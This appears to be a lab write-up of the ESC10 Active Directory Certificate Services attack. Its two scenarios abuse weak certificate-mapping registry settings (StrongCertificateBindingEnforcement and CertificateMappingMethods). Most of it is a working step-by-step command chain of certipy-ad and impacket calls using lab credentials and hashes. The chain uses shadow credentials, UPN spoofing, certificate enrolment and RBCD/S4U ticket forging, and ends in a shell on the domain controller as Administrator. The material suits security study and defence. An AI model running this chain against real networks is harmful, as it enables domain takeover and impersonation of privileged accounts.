This attack shares a lot of similarities with ESC9 type of attack where the main target is subverting the Certification mapping process in order to gain impersonation over another user.
The main difference with ESC9 is that **ESC10** targets misconfigurations in the **registry** of the *CA(Certification Authority)* rather than the Certification templates.
For this technique there will be 2 main ways that can be used to PE and will be described in the following sections.

# Attack Scenario 1
The first case involves a misconfiguration in the `StrongCertificateBindingEnforcement` registry key, which handles certificate mapping during Kerberos authentication.
 Consequently, Case 1 exploitation requires authentication via Kerberos with the certificate.
## Requisites
1. The `StrongCertificateBindingEnforcement` registry key is set to `0`, indicating that no strong mapping is performed. It's important to note that this value will only be considered if the April 2023 updates have yet to be installed.
2. At least one template specifies that client authentication is enabled (e.g., the built-in User template).
3. We have at least `GenericWrite` rights for account A, allowing us to compromise account B.
## Enumeration:
In a realistic approach a *low-priv* user won't have permission to read Registry values, so it is required a Administrative account that can do this on the CA server.
- We start by reviewing the Registry settings with Administrative account.
```
impacket-reg 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'

Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

HKLM\SYSTEM\CurrentControlSet\Services\Kdc
        DependOnService REG_MULTI_SZ     RpcSsAfdNTDS
        Description     REG_SZ   @%SystemRoot%\System32\kdcsvc.dll,-2
        DisplayName     REG_SZ   @%SystemRoot%\System32\kdcsvc.dll,-1
        ErrorControl    REG_DWORD        0x1
        Group   REG_SZ   MS_WindowsRemoteValidation
        ImagePath       REG_EXPAND_SZ    %SystemRoot%\System32\lsass.exe
        ObjectName      REG_SZ   LocalSystem
        Start   REG_DWORD        0x2
        Type    REG_DWORD        0x20
        StrongCertificateBindingEnforcement     REG_DWORD        0x0
HKLM\SYSTEM\CurrentControlSet\Services\Kdc\Parameters
HKLM\SYSTEM\CurrentControlSet\Services\Kdc\Security
```
As you see the **StrongCertificateBindingEnforcement=0** which was a requirement and it allows us to proceed. In case of parameter *not defined* in the registry the attack must be blindly executed to understand if feasible.
- Next, we can grab the NTHash of a user that we hold *GenericWrite* permission ex: **User2** via **Shadow Credential** attack.
```
certipy-ad shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
```
- Change the UPN of User2 to match the **Administrator** UPN.
```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn administrator@lab.local
```
- Now we can enroll a new certificate for impersonation from **User2 --> Administrator** with the NTHash obtained before
```
certipy-ad req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User
```
- Rollback the User2's UPN to its original state
```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```
- Lastly, using the *Administrator.pfx* performing a authentication to AD and requesting a valid TGT *ccache* ticket that can be used to impersonate as Administrator on the domain.
```
certipy-ad auth -pfx administrator.pfx -domain lab.local
```
As usual point to the **ccache** and use the kerberos authentication to take even further your attacks to the AD.
```
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass LAB-DC.LAB.LOCAL

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```


# Attack Scenario 2
The second case is related to a misconfiguration in the `CertificateMappingMethods` registry key, which controls certificate mapping during *Schannel* authentication.
 Consequently, Case 2 requires Schannel authentication.
## Requisites
1. The `CertificateMappingMethods` registry key is set to `0x4`, indicating no strong mapping.
2. At least one template is enabled for `client authentication` (e.g., the built-in User template).
3. We have at least `GenericWrite` rights for any account A, allowing us to compromise any account B that does not already have a UPN set (e.g., machine accounts or built-in Administrator accounts). This is important to avoid constraint violation errors on the UPN.
## Enumeration:
In a realistic approach a *low-priv* user won't have permission to read Registry values, so it is required a Administrative account that can do this on the CA server.
- We start by reviewing the Registry settings with Administrative account.
```
impacket-reg 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'

Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
        EventLogging    REG_DWORD        0x1
               REG_DWORD        0x4
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CipherSuites
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
```
As you see the **CertificateMappingMethods=4** which is the requisite to proceed with the attack.
- We can now use the GenericWrite permission that out account held over User2 to change the UPN from **User2 --> LAB-DC (DC's UPN)**
```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 'lab-dc$@lab.local'
```
- Now we can enroll a new certificate by matching the UPN of the *DC computer object* that will be used for the machine takeover.
```
certipy-ad req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User
```
- Revert back the UPN of *User2* to it's original state
```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```
- The idea now is to perform a RBCD attack so we start by adding a new dummy computer object to AD.
```
certipy-ad auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell

# add_computer plaintext plaintext123
result: OK
```
- Next adding the **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute on the machine on behalf of the DC.
```
 certipy-ad auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell

# set_rbcd lab-dc$ plaintext$
Delegation rights modified successfully!
plaintext$ can now impersonate users on lab-dc$ via S4U2Proxy
```
- Now, abusing the RBCD via S4u attack to forge a new TGT that can be used to perform the impersonation on the *DC* as **Administrator**
```
impacket-getST -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.205.199 lab.local/'plaintext$':plaintext123
```
- Lastly using the Kerberos ticket to take over the DC
```
export KRB5CCNAME=Administrator.ccache 
impacket-wmiexec -k -no-pass LAB-DC.LAB.LOCAL

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```